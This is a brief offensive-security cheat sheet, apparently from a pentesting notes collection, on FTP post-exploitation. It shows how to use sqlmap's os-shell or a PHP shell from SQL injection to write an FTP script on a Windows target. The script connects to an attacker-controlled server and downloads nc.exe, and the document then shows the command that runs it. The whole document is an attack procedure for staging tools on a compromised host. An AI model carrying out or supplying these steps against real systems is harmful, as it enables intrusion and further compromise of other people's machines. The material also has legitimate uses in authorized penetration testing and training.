# FTP Post Exploitation Techniques
This module will contain all FTP-related tasks used during post-exploitation.
## Create an FTP Script
This is a script to run as you call FTP from the shell. This is best for non-interactive shells, such as the `os-shell>` provided by `sqlmap` or a PHP shell provided by an SQL Injection exploit. The following example is done from the `--os-shell` provided by `sqlmap`. 

`os-shell> echo open (YOUR IP) 21> C:\share\ftp.txt` *(Writeable Directory on target)*

`os-shell> echo USER pwnt>> C:\share\ftp.txt` 

`os-shell> echo passwd>> C:\share\ftp.txt` *(Password for your FTP Server)*

`os-shell> echo bin>> C:\share\ftp.txt` *(Sets transfer up for binary files/bytes)* 

`os-shell> echo GET nc.exe C:\share\nc.exe>> C:\share\ftp.txt` 

`os-shell> echo bye>> C:\share\ftp.txt` 

Then, we can run the script with:

`os-shell> ftp -v -n -s:C:\share\ftp.txt` *(PATH to your Script on Target)*
